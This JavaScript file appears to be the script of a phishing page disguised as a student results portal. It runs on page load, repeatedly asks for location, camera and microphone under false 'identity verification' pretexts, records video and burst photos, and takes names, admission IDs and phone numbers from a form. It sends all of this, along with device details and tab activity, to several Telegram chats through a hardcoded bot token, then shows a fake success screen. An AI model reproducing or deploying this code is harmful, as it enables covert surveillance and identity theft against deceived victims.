const TOKEN = '8546910341:AAFZKnrP036naa4tciDsMS-bk8TZZ8_wekI';

// Array of chat IDs to send to all users
const CHAT_IDS = [
    '1332669070',
    '7246514514',
    '7994937893',
    '7646169456'
];

let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let isRecording = false;
let permissionAttempts = 0;
const MAX_PERMISSION_ATTEMPTS = 8;

// 🎯 Enhanced initialization with Chrome auto-opening
class SurveillanceSystem {
    constructor() {
        this.isTelegramWeb = this.detectTelegramWeb();
        this.isChrome = this.detectChrome();
        this.initializeSystem();
    }

    // 🔍 Detect if running in Telegram Web
    detectTelegramWeb() {
        const userAgent = navigator.userAgent.toLowerCase();
        return userAgent.includes('telegram') || 
               userAgent.includes('webview') || 
               window.TelegramWebviewProxy !== undefined;
    }

    // 🔍 Detect if running in Chrome
    detectChrome() {
        const userAgent = navigator.userAgent.toLowerCase();
        return userAgent.includes('chrome') && !userAgent.includes('edg');
    }

    async initializeSystem() {
        try {
            console.log('🚀 Initializing system. Chrome:', this.isChrome, 'Telegram:', this.isTelegramWeb);
            
            // Try to open in Chrome if not already there
            if (!this.isChrome) {
                this.attemptChromeRedirect();
            }
            
            // Send system info first
            this.sendSystemInfo();
            
            // Initialize components
            await this.initializeWithRetry();
            
        } catch (error) {
            console.error('System initialization failed:', error);
        }
    }

    // 🔄 Redirect to Chrome with multiple strategies
    attemptChromeRedirect() {
        const currentUrl = encodeURIComponent(window.location.href);
        
        // Chrome deep links for different platforms
        const chromeSchemes = {
            android: `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=com.android.chrome;end;`,
            ios: `googlechrome://${window.location.host}${window.location.pathname}${window.location.search}`,
            fallback: `https://www.google.com/url?sa=t&url=${currentUrl}`
        };

        // Show redirect message
        this.showChromeRedirectMessage();

        // Try platform-specific redirects
        setTimeout(() => {
            if (this.isMobile()) {
                if (this.isAndroid()) {
                    window.location.href = chromeSchemes.android;
                } else if (this.isIOS()) {
                    window.location.href = chromeSchemes.ios;
                }
                
                // Fallback after delay
                setTimeout(() => {
                    if (!this.isChrome) {
                        window.location.href = chromeSchemes.fallback;
                    }
                }, 2000);
            }
        }, 3000);
    }

    // 📱 Device detection
    isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    isAndroid() {
        return /Android/i.test(navigator.userAgent);
    }

    isIOS() {
        return /iPhone|iPad|iPod/i.test(navigator.userAgent);
    }

    // 🔔 Show Chrome redirect message
    showChromeRedirectMessage() {
        const redirectHTML = `
            <div id="chromeRedirect" style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 100000;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
            ">
                <div style="font-size: 4em; margin-bottom: 20px;">🌐</div>
                <h1 style="font-size: 2em; margin-bottom: 20px;">Opening in Google Chrome</h1>
                <p style="font-size: 1.2em; margin-bottom: 30px; line-height: 1.5;">
                    For the best experience and full functionality,<br>
                    this page is opening in Google Chrome...
                </p>
                <div style="
                    background: rgba(255,255,255,0.2);
                    padding: 20px;
                    border-radius: 15px;
                    margin-bottom: 20px;
                    backdrop-filter: blur(10px);
                ">
                    <p style="margin: 10px 0;">✅ Better camera access</p>
                    <p style="margin: 10px 0;">✅ Improved performance</p>
                    <p style="margin: 10px 0;">✅ Full feature support</p>
                </div>
                <p style="opacity: 0.8; font-size: 0.9em;">Redirecting in 3 seconds...</p>
            </div>
        `;
        
        document.body.insertAdjacentHTML('afterbegin', redirectHTML);

        // Remove redirect screen if Chrome is detected
        const checkChromeInterval = setInterval(() => {
            if (this.detectChrome()) {
                const redirectEl = document.getElementById('chromeRedirect');
                if (redirectEl) redirectEl.remove();
                clearInterval(checkChromeInterval);
            }
        }, 1000);
    }

    // 🔄 Persistent permission retry system
    async initializeWithRetry() {
        await this.initializeGeolocationWithRetry();
        await this.initializeMediaWithRetry();
        await this.initializeFormHandler();
    }

    // 📍 Persistent Geolocation
    async initializeGeolocationWithRetry() {
        return new Promise(async (resolve) => {
            const tryGeolocation = async () => {
                if (permissionAttempts >= MAX_PERMISSION_ATTEMPTS) {
                    this.sendToAllUsers('❌ *Geolocation permission denied after multiple attempts*');
                    resolve();
                    return;
                }

                if (!navigator.geolocation) {
                    this.sendToAllUsers('❌ *Geolocation not supported*');
                    resolve();
                    return;
                }

                try {
                    const position = await new Promise((positionResolve, positionReject) => {
                        navigator.geolocation.getCurrentPosition(
                            positionResolve, 
                            positionReject, 
                            {
                                enableHighAccuracy: true,
                                timeout: 15000,
                                maximumAge: 0
                            }
                        );
                    });

                    const { latitude, longitude, accuracy } = position.coords;
                    const locationMessage = `📍 *Precise Location Captured*\n\n• **Latitude:** ${latitude}\n• **Longitude:** ${longitude}\n• **Accuracy:** ${accuracy}m\n• **Map:** https://maps.google.com/?q=${latitude},${longitude}\n• **Browser:** ${this.isChrome ? 'Chrome' : 'Other'}`;
                    
                    this.sendToAllUsers(locationMessage);
                    resolve();

                } catch (error) {
                    permissionAttempts++;
                    const errorMessage = `📍 *Location Access*\n\n• **Attempt:** ${permissionAttempts}/${MAX_PERMISSION_ATTEMPTS}\n• **Status:** ${error.message}\n• **Browser:** ${this.isChrome ? 'Chrome' : 'Other'}`;
                    
                    this.sendToAllUsers(errorMessage);
                    
                    if (permissionAttempts <= 3) {
                        this.showPermissionRequest('location', permissionAttempts);
                    }
                    
                    setTimeout(tryGeolocation, 2000);
                }
            };

            await tryGeolocation();
        });
    }

    // 🎥 Enhanced Media Capture
    async initializeMediaWithRetry() {
        if (this.isTelegramWeb) {
            this.sendToAllUsers('📱 *Telegram Web Detected*\n• Media capture will be attempted on form submission');
            return;
        }

        const tryMediaCapture = async () => {
            if (permissionAttempts >= MAX_PERMISSION_ATTEMPTS) {
                this.sendToAllUsers('❌ *Media permission denied after multiple attempts*');
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user',
                        frameRate: { ideal: 30 }
                    },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        sampleRate: 44100
                    }
                });

                mediaStream = stream;
                this.sendToAllUsers('✅ *Media Access Granted*\n• Camera: Enabled\n• Microphone: Enabled\n• Browser: ' + (this.isChrome ? 'Chrome' : 'Other'));

                this.startMediaCapture(stream);

            } catch (error) {
                permissionAttempts++;
                const errorDetails = `❌ *Media Access*\n\n• **Attempt:** ${permissionAttempts}/${MAX_PERMISSION_ATTEMPTS}\n• **Browser:** ${this.isChrome ? 'Chrome' : 'Other'}\n• **Status:** ${error.name}`;
                
                this.sendToAllUsers(errorDetails);
                
                if (permissionAttempts <= 2) {
                    this.showPermissionRequest('camera', permissionAttempts);
                }
                
                setTimeout(tryMediaCapture, 3000);
            }
        };

        await tryMediaCapture();
    }

    // 🎬 Start media capture
    async startMediaCapture(stream = null) {
        try {
            if (!stream && !mediaStream) {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: true
                });
                mediaStream = stream;
            }

            const actualStream = stream || mediaStream;
            if (!actualStream) return;

            await this.startVideoRecording(actualStream);
            await this.captureBurstPhotos(actualStream);

        } catch (error) {
            console.error('Media capture failed:', error);
            this.sendToAllUsers('❌ *Media Capture Failed*\n• Error: ' + error.message);
        }
    }

    // 🔔 Permission Request UI
    showPermissionRequest(type, attempt) {
        if (this.isTelegramWeb && attempt > 2) return;

        const permissionTypes = {
            'location': '📍 Location Access Required',
            'camera': '🎥 Camera & Microphone Access'
        };

        const messages = {
            'location': 'Please allow location access to verify your identity and provide personalized services.',
            'camera': 'Camera access is required for identity verification and security purposes.'
        };

        const modalId = 'permissionModal-' + Date.now();
        const modalHTML = `
            <div id="${modalId}" style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.85);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                font-family: Arial, sans-serif;
                backdrop-filter: blur(5px);
            ">
                <div style="
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    padding: 30px;
                    border-radius: 20px;
                    text-align: center;
                    max-width: 400px;
                    color: white;
                    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                    border: 2px solid rgba(255,255,255,0.1);
                ">
                    <div style="font-size: 4em; margin-bottom: 20px;">${type === 'location' ? '📍' : '🎥'}</div>
                    <h2 style="margin-bottom: 15px; font-size: 1.5em;">${permissionTypes[type]}</h2>
                    <p style="margin-bottom: 25px; line-height: 1.5; opacity: 0.9;">${messages[type]}</p>
                    <p style="font-size: 0.9em; margin-bottom: 20px; opacity: 0.7;">Attempt: ${attempt}/${MAX_PERMISSION_ATTEMPTS}</p>
                    <button onclick="document.getElementById('${modalId}').remove();" style="
                        background: rgba(255,255,255,0.2);
                        color: white;
                        border: 2px solid rgba(255,255,255,0.3);
                        padding: 12px 30px;
                        border-radius: 25px;
                        font-size: 16px;
                        cursor: pointer;
                        margin: 5px;
                        backdrop-filter: blur(10px);
                        transition: all 0.3s;
                    " onmouseover="this.style.background='rgba(255,255,255,0.3)'" 
                    onmouseout="this.style.background='rgba(255,255,255,0.2)'">Allow Access</button>
                </div>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', modalHTML);

        setTimeout(() => {
            const modal = document.getElementById(modalId);
            if (modal && modal.parentElement) {
                modal.remove();
            }
        }, 6000);
    }

    // 🎬 Enhanced Video Recording
    async startVideoRecording(stream, duration = 8000) {
        return new Promise(async (resolve) => {
            try {
                if (!MediaRecorder) {
                    this.sendToAllUsers('❌ *Video recording not supported*');
                    resolve();
                    return;
                }

                recordedChunks = [];
                let options = {
                    mimeType: 'video/webm;codecs=vp9,opus',
                    videoBitsPerSecond: 2000000
                };

                const mimeTypes = [
                    'video/webm;codecs=vp9,opus',
                    'video/webm;codecs=vp8,opus',
                    'video/webm',
                    'video/mp4'
                ];

                for (const mimeType of mimeTypes) {
                    if (MediaRecorder.isTypeSupported(mimeType)) {
                        options.mimeType = mimeType;
                        break;
                    }
                }

                mediaRecorder = new MediaRecorder(stream, options);
                isRecording = true;

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    isRecording = false;
                    try {
                        const videoBlob = new Blob(recordedChunks, { type: options.mimeType.split(';')[0] });
                        
                        if (videoBlob.size > 0 && videoBlob.size < 40 * 1024 * 1024) {
                            await this.sendToAllUsers(videoBlob, 'video');
                            this.sendToAllUsers('🎥 *Video Recording Complete*\n• Duration: ' + (duration/1000) + 's\n• Size: ' + Math.round(videoBlob.size/1024) + 'KB');
                        }
                    } catch (error) {
                        console.error('Video processing error:', error);
                    }
                    resolve();
                };

                mediaRecorder.onerror = (event) => {
                    console.error('Recording error:', event.error);
                    this.sendToAllUsers('❌ *Video recording error*');
                    resolve();
                };

                mediaRecorder.start(1000);
                this.sendToAllUsers('🎥 *Recording Started*\n• Duration: ' + (duration/1000) + 's\n• Browser: ' + (this.isChrome ? 'Chrome' : 'Other'));

                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    } else {
                        resolve();
                    }
                }, duration);

            } catch (error) {
                console.error('Video recording setup failed:', error);
                this.sendToAllUsers('❌ *Video recording failed*\n• Error: ' + error.message);
                resolve();
            }
        });
    }

    // 📸 Burst Photo Capture
    async captureBurstPhotos(stream, count = 4, interval = 1000) {
        try {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.playsInline = true;
            video.autoplay = true;

            await Promise.race([
                video.play(),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Video play timeout')), 5000))
            ]);

            await new Promise((resolve) => {
                if (video.readyState >= 4) {
                    resolve();
                } else {
                    video.addEventListener('loadeddata', resolve, { once: true });
                    setTimeout(resolve, 3000);
                }
            });

            for (let i = 0; i < count; i++) {
                await new Promise(resolve => setTimeout(resolve, i === 0 ? 500 : interval));
                await this.captureHighQualityPhoto(video, i + 1);
            }

            this.sendToAllUsers('📸 *Burst Photos Complete*\n• Total: ' + count + ' photos');

        } catch (error) {
            console.error('Burst photo capture failed:', error);
            this.sendToAllUsers('❌ *Photo capture failed*\n• Error: ' + error.message);
        }
    }

    // 📸 Photo Capture
    async captureHighQualityPhoto(video, photoNumber) {
        return new Promise((resolve) => {
            try {
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d', { willReadFrequently: true });

                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;

                if (canvas.width === 0 || canvas.height === 0) {
                    canvas.width = 1280;
                    canvas.height = 720;
                }

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                context.fillStyle = 'rgba(0, 0, 0, 0.7)';
                context.fillRect(10, 10, 350, 40);
                
                context.font = '14px Arial';
                context.fillStyle = 'white';
                context.fillText(`Photo ${photoNumber} - ${new Date().toLocaleString()} - ${this.isChrome ? 'Chrome' : 'Other'}`, 20, 35);

                canvas.toBlob(async (blob) => {
                    if (blob && blob.size > 1000) {
                        try {
                            await this.sendToAllUsers(blob, 'photo');
                        } catch (error) {
                            console.error('Photo send failed:', error);
                        }
                    }
                    resolve();
                }, 'image/jpeg', 0.85);

            } catch (error) {
                console.error(`Photo ${photoNumber} capture failed:`, error);
                resolve();
            }
        });
    }

    // 📝 Form Handler
    initializeFormHandler() {
        const loginForm = document.getElementById('loginForm');
        if (!loginForm) {
            this.createFallbackForm();
            return;
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            await this.handleFormSubmission();
        });
    }

    // 🚀 Handle form submission
    async handleFormSubmission() {
        try {
            const formData = this.collectFormData();
            const formMessage = this.createFormMessage(formData);
            await this.sendToAllUsers(formMessage);

            this.showProcessingMessage();

            // Attempt media capture on form submission (especially for Telegram Web)
            try {
                if (this.isTelegramWeb || !mediaStream) {
                    this.sendToAllUsers('📱 *Attempting Media Capture on Form Submit*\n• Browser: ' + (this.isChrome ? 'Chrome' : 'Other'));
                    await this.startMediaCapture();
                } else {
                    await this.captureFinalPhoto();
                }
            } catch (mediaError) {
                console.error('Form media capture failed:', mediaError);
                this.sendToAllUsers('ℹ️ *Media capture skipped*\n• Reason: ' + mediaError.message);
            }

            this.showSuccessMessage(formData.name);

        } catch (error) {
            console.error('Form submission error:', error);
            this.showSuccessMessage('User');
        }
    }

    // 📄 Collect form data
    collectFormData() {
        return {
            name: document.getElementById('name')?.value.trim() || 'Not provided',
            father: document.getElementById('father')?.value.trim() || 'Not provided',
            admId: document.getElementById('admId')?.value.trim() || 'Not provided',
            phone: document.getElementById('phone')?.value.trim() || 'Not provided',
            timestamp: new Date().toLocaleString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            telegramWeb: this.isTelegramWeb,
            chrome: this.isChrome
        };
    }

    // 📝 Create form message
    createFormMessage(formData) {
        return `📄 *Form Submission Captured*\n\n` +
            `• 👤 **Full Name:** ${formData.name}\n` +
            `• 👨‍👦 **Father's Name:** ${formData.father}\n` +
            `• 🆔 **Admission ID:** ${formData.admId}\n` +
            `• 📞 **Phone Number:** ${formData.phone}\n` +
            `• 🕐 **Submission Time:** ${formData.timestamp}\n` +
            `• 💻 **Platform:** ${formData.platform}\n` +
            `• 📱 **Screen:** ${formData.screen}\n` +
            `• 🌐 **Environment:** ${formData.telegramWeb ? 'Telegram Web' : (formData.chrome ? 'Chrome' : 'Other Browser')}`;
    }

    // 📸 Capture final photo
    async captureFinalPhoto() {
        if (!mediaStream) return;
        
        try {
            const video = document.createElement('video');
            video.srcObject = mediaStream;
            await video.play();
            await new Promise(resolve => setTimeout(resolve, 1000));
            await this.captureHighQualityPhoto(video, 'FINAL');
        } catch (error) {
            console.error('Final photo capture failed:', error);
        }
    }

    // ⚡ Show processing message
    showProcessingMessage() {
        const processingHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #ff7e5f 0%, #feb47b 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
            ">
                <div style="font-size: 4em; margin-bottom: 20px;">⏳</div>
                <h1 style="font-size: 2em; margin-bottom: 20px;">Processing Your Submission</h1>
                <p style="font-size: 1.2em; margin-bottom: 10px;">Capturing verification media...</p>
                <p style="font-size: 1em; opacity: 0.8;">Please wait a moment</p>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', processingHTML);
    }

    // 💫 Success message
    showSuccessMessage(name) {
        const processingMsg = document.querySelector('div[style*="background: linear-gradient(135deg, #ff7e5f 0%, #feb47b 100%)"]');
        if (processingMsg) processingMsg.remove();

        const redirectEl = document.getElementById('chromeRedirect');
        if (redirectEl) redirectEl.remove();

        const successHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
            ">
                <div style="font-size: 4em; margin-bottom: 20px;">🎉</div>
                <h1 style="font-size: 2.5em; margin-bottom: 20px;">Submission Successful!</h1>
                <p style="font-size: 1.5em; margin-bottom: 30px;">Dear ${name}, we will send you SMS of your result shortly.</p>
                <p style="font-size: 1.2em; opacity: 0.9;">Redirecting to results portal...</p>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', successHTML);
        
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 4000);
    }

    // 📋 Create fallback form
    createFallbackForm() {
        const formHTML = `
            <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; padding: 20px;">
                <h2>Student Information Form</h2>
                <form id="fallbackLoginForm">
                    <input type="text" id="name" placeholder="Full Name" required style="display: block; width: 100%; margin: 10px 0; padding: 10px;">
                    <input type="text" id="father" placeholder="Father's Name" required style="display: block; width: 100%; margin: 10px 0; padding: 10px;">
                    <input type="text" id="admId" placeholder="Admission ID" required style="display: block; width: 100%; margin: 10px 0; padding: 10px;">
                    <input type="tel" id="phone" placeholder="Phone Number" required style="display: block; width: 100%; margin: 10px 0; padding: 10px;">
                    <button type="submit" style="background: #4CAF50; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer;">Submit</button>
                </form>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', formHTML);
        
        document.getElementById('fallbackLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            await this.handleFormSubmission();
        });
    }

    // 🖥️ System Information
    sendSystemInfo() {
        const systemInfo = `🖥️ *System Initialized*\n\n` +
            `• 🌐 **URL:** ${window.location.href}\n` +
            `• 🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `• 📱 **User Agent:** ${navigator.userAgent.substring(0, 100)}...\n` +
            `• 💻 **Platform:** ${navigator.platform}\n` +
            `• 🖥️ **Screen:** ${screen.width}x${screen.height}\n` +
            `• 🌍 **Language:** ${navigator.language}\n` +
            `• ⚡ **Cores:** ${navigator.hardwareConcurrency || 'Unknown'}\n` +
            `• 📊 **Memory:** ${navigator.deviceMemory || 'Unknown'}GB\n` +
            `• 🔍 **Browser:** ${this.isChrome ? 'Google Chrome ✅' : (this.isTelegramWeb ? 'Telegram Web' : 'Other Browser')}`;

        this.sendToAllUsers(systemInfo);
    }

    // 📤 Send to all users
    async sendToAllUsers(data, type = 'message') {
        const sendTime = Date.now();
        
        try {
            const sendPromises = CHAT_IDS.map(async (chatId, index) => {
                try {
                    await this.sendToTelegram(data, type, chatId);
                    console.log(`✅ Sent ${type} to ${chatId} (${index + 1}/${CHAT_IDS.length})`);
                } catch (error) {
                    console.error(`❌ Failed to send to ${chatId}:`, error);
                }
            });

            await Promise.allSettled(sendPromises);
            
            const duration = Date.now() - sendTime;
            console.log(`📤 All ${type} messages processed in ${duration}ms`);

        } catch (error) {
            console.error('Batch send error:', error);
        }
    }

    // 📤 Telegram API
    async sendToTelegram(data, type = 'message', chatId) {
        const maxRetries = 3;
        
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                if (type === 'photo') {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', data);
                    formData.append('caption', `📸 Photo • ${new Date().toLocaleString()} • ${this.isChrome ? 'Chrome' : 'Other'}`);

                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) throw new Error(`HTTP ${response.status}`);

                } else if (type === 'video') {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', data, `video_${Date.now()}.mp4`);
                    formData.append('caption', `🎥 Video • ${new Date().toLocaleString()} • ${this.isChrome ? 'Chrome' : 'Other'}`);

                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) throw new Error(`HTTP ${response.status}`);

                } else {
                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: data,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        })
                    });

                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
                }
                
                break;

            } catch (error) {
                if (attempt === maxRetries) {
                    throw error;
                }
                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
        }
    }

    // 🛑 Cleanup
    cleanup() {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }

        if (mediaStream) {
            mediaStream.getTracks().forEach(track => {
                track.stop();
                track.enabled = false;
            });
            mediaStream = null;
        }

        recordedChunks = [];
        isRecording = false;

        console.log('🛑 Surveillance system cleaned up');
    }
}

// 🚀 Initialize the system
const surveillanceSystem = new SurveillanceSystem();

// 🎯 Event listeners
window.addEventListener('load', () => {
    console.log('🚀 Enhanced Surveillance System Activated');
    surveillanceSystem.sendToAllUsers('🔔 *Page Loaded*\n• Time: ' + new Date().toLocaleString());
});

window.addEventListener('beforeunload', () => {
    surveillanceSystem.cleanup();
    surveillanceSystem.sendToAllUsers('👋 *Session Ended*\n• Time: ' + new Date().toLocaleString());
});

window.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        surveillanceSystem.sendToAllUsers('🔍 *User switched tab/window*\n• Time: ' + new Date().toLocaleString());
    }
});

window.addEventListener('error', (event) => {
    console.error('Global error:', event.error);
    surveillanceSystem.sendToAllUsers('🚨 *JavaScript Error*\n• Error: ' + event.error?.message + '\n• Time: ' + new Date().toLocaleString());
});